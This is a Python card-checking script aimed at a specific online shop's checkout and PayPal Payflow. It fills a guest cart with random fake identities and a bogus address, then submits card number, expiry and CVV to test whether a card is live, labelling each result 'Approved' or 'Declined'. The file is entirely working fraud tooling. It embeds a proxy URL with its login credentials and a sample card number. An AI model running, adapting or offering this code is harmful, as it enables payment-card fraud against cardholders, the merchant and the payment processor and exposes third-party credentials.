from retry import retry
from requests import Session
import names
import random

class ConfigsPAge:
    def QueryText(self, data:str = None, chainOne:str = None, chainTwo:str = None):
            self.uophs = data[ data.index(chainOne) + len (chainOne):data.index(chainTwo,  data.index(chainOne) + len (chainOne))]
            try:
                return self.uophs
            except: 
                return 'value not found' 
    def RandomName(self,dato:str=None):
        if dato == 'username': return f"{names.get_first_name()}{names.get_last_name()}{random.randint(1000000,9999999)}"
        elif dato == 'correo': return f"{names.get_first_name()}{names.get_last_name()}{random.randint(1000000,9999999)}@gmail.com"
        elif dato == 'password': return f"{names.get_first_name()}{names.get_last_name()}#{random.randint(1000000,9999999)}"
        else: return 'Valores InCorrectos: username, password, correo'

    
    
    def SaveResponseHhml(self, response:str):
        with open("ResponseHhml.html", "w", encoding="utf-8") as f:
            f.write(response)

proxy_url = 'http://97758037913464da:RNW78Fm5@res.proxy-seller.com:10000'
class pfch:
    @retry(tries=3)
    def main(self,card):
        try: 
            cc = card.split("|")
            if cc[0][0] == '4': cctype = 'VI'
            elif cc[0][0] == '5': cctype = 'MC'
            elif cc[0][0] == '6': cctype = 'AMEX'
            self.UseMail = ConfigsPAge().RandomName('correo')

            self.session = Session()
  
            headers = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-language': 'es-419,es;q=0.9','cache-control': 'max-age=0','priority': 'u=0, i','referer': 'https://babysongs.com/','upgrade-insecure-requests': '1','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',                }
            r1 = self.session.get('https://babysongs.com/baby-songs-sing-together-dvd.html', headers=headers)
            phpsessidvalue = self.session.cookies.get('PHPSESSID')
            form_key = ConfigsPAge().QueryText(r1.text,'name="form_key" type="hidden" value="','"')

            headers = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-language': 'es-419,es;q=0.9','cache-control': 'max-age=0','content-type': 'application/x-www-form-urlencoded','origin': 'https://babysongs.com','priority': 'u=0, i','referer': 'https://babysongs.com/baby-songs-sing-together-dvd.html','upgrade-insecure-requests': '1','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36', 'cookie': 'form_key=' +form_key+ '; PHPSESSID=' +phpsessidvalue+ '',}
            data = {'product': '9','selected_configurable_option': '','related_product': '','item': '9','form_key': form_key,'qty': '1',}
            response = self.session.post('https://babysongs.com/checkout/cart/add/uenc/aHR0cHM6Ly9iYWJ5c29uZ3MuY29tL2JhYnktc29uZ3Mtc2luZy10b2dldGhlci1kdmQuaHRtbA%2C%2C/product/9/', headers=headers, data=data,)

            headers = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-language': 'es-419,es;q=0.9','cache-control': 'max-age=0','priority': 'u=0, i','referer': 'https://babysongs.com/baby-songs-sing-together-dvd.html','upgrade-insecure-requests': '1','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36','cookie': 'form_key=' +form_key+ '; PHPSESSID=' +phpsessidvalue+ '',}
            response = self.session.get('https://babysongs.com/checkout/cart/', headers=headers)

            headers = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-language': 'es-419,es;q=0.9','priority': 'u=0, i','referer': 'https://babysongs.com/checkout/cart/','sec-ch-ua': '"Chromium";v="134", "Not:A-Brand";v="24", "Google Chrome";v="134"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'document','sec-fetch-mode': 'navigate','sec-fetch-site': 'same-origin','sec-fetch-user': '?1','upgrade-insecure-requests': '1','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36','cookie': 'form_key=' +form_key+ '; PHPSESSID=' +phpsessidvalue+ '',}
            r2 = self.session.get('https://babysongs.com/checkout/', headers=headers)
            enti_id = ConfigsPAge().QueryText(r2.text,'{"entity_id":"', '"')

            headers = {'accept': '*/*','accept-language': 'es-419,es;q=0.9','content-type': 'application/json','origin': 'https://babysongs.com','priority': 'u=1, i','referer': 'https://babysongs.com/checkout/','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36','x-requested-with': 'XMLHttpRequest',}
            json_data = {'address': {'street': ['Times Square, Nueva York, EE. UU.',],'city': 'Manhattan','region_id': '43','region': 'New York','country_id': 'US','postcode': '10036','firstname': 'saddada','lastname': 'fsafafasf','company': '','telephone': '',},}
            response = self.session.post(f'https://babysongs.com/rest/default/V1/guest-carts/{enti_id}/estimate-shipping-methods', headers=headers, json=json_data,)
            
            headers = {'accept': '*/*','accept-language': 'es-419,es;q=0.9','content-type': 'application/json','origin': 'https://babysongs.com','priority': 'u=1, i','referer': 'https://babysongs.com/checkout/','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36','x-requested-with': 'XMLHttpRequest',}
            json_data = {'addressInformation': {'shipping_address': {'countryId': 'US','regionId': '43','regionCode': 'NY','region': 'New York','street': ['Times Square, Nueva York, EE. UU.',],'company': '','telephone': '5657843454','postcode': '10036','city': 'Manhattan','firstname': 'saddada','lastname': 'fsafafasf',},'billing_address': {'countryId': 'US','regionId': '43','regionCode': 'NY','region': 'New York','street': ['Times Square, Nueva York, EE. UU.',],'company': '','telephone': '5657843454','postcode': '10036','city': 'Manhattan','firstname': 'saddada','lastname': 'fsafafasf','saveInAddressBook': None,},'shipping_method_code': 'freeshipping','shipping_carrier_code': 'freeshipping','extension_attributes': {},},}
            response = self.session.post(f'https://babysongs.com/rest/default/V1/guest-carts/{enti_id}/shipping-information', headers=headers, json=json_data,)

            headers = {'accept': '*/*','accept-language': 'es-419,es;q=0.9','content-type': 'application/json','origin': 'https://babysongs.com','priority': 'u=1, i','referer': 'https://babysongs.com/checkout/','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36','x-requested-with': 'XMLHttpRequest',}
            json_data = {'cartId': f'{enti_id}','paymentMethod': {'method': 'payflowpro','additional_data': {'cc_type': f'{cctype}','cc_exp_year': f'{cc[2]}','cc_exp_month': f'{cc[1]}','cc_last_4': '9044',},},'email': F'{self.UseMail}','billingAddress': {'countryId': 'US','regionId': '43','regionCode': 'NY','region': 'New York','street': ['Times Square, Nueva York, EE. UU.',],'company': '','telephone': '5657843454','postcode': '10036','city': 'Manhattan','firstname': 'saddada','lastname': 'fsafafasf','saveInAddressBook': None,},}
            response = self.session.post(f'https://babysongs.com/rest/default/V1/guest-carts/{enti_id}/set-payment-information', headers=headers, json=json_data,)

            headers = {'accept': 'application/json, text/javascript, */*; q=0.01','accept-language': 'es-419,es;q=0.9','content-type': 'application/x-www-form-urlencoded; charset=UTF-8','origin': 'https://babysongs.com','priority': 'u=1, i','referer': 'https://babysongs.com/checkout/','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36','x-requested-with': 'XMLHttpRequest',}
            data = [('form_key', form_key),('captcha_form_id', 'payment_processing_request'),('payment[method]', 'payflowpro'),('billing-address-same-as-shipping', 'on'),('captcha_form_id', 'co-payment-form'),('controller', 'checkout_flow'),('cc_type', f'{cctype}'),]
            r3 = self.session.post('https://babysongs.com/paypal/transparent/requestSecureToken/', headers=headers, data=data,)
            securetoken = ConfigsPAge().QueryText(r3.text,'"securetoken":"','"')
            securetokenid = ConfigsPAge().QueryText(r3.text,'"securetokenid":"','"')

            headers = {'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','Accept-Language': 'es-419,es;q=0.9','Cache-Control': 'max-age=0','Connection': 'keep-alive','Content-Type': 'application/x-www-form-urlencoded','Origin': 'https://babysongs.com','Referer': 'https://babysongs.com/','Upgrade-Insecure-Requests': '1','User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',}
            data = {'result': '0','securetoken': securetoken,'securetokenid': securetokenid,'respmsg': 'Approved','result_code': '0','csc': f'{cc[3]}','expdate': f'{cc[1]}{cc[2]}','acct': f'{cc[0]}',}
            r4 = self.session.post('https://payflowlink.paypal.com/', headers=headers, data=data)
            r5_text = r4.text
            respmsg = ConfigsPAge().QueryText(r5_text, 'name="RESPMSG" value="', '"') 
            if 'CVV2' in respmsg:return 'Approved! ✅', respmsg
            else:return 'Declined! ❌', respmsg
        except  : return 'Declined! ❌','Declined: 15005-This transaction cannot be processed. '

    
if __name__ == "__main__":
    cc = '4800126405060713|03|2029|326'
    print(pfch().main(cc))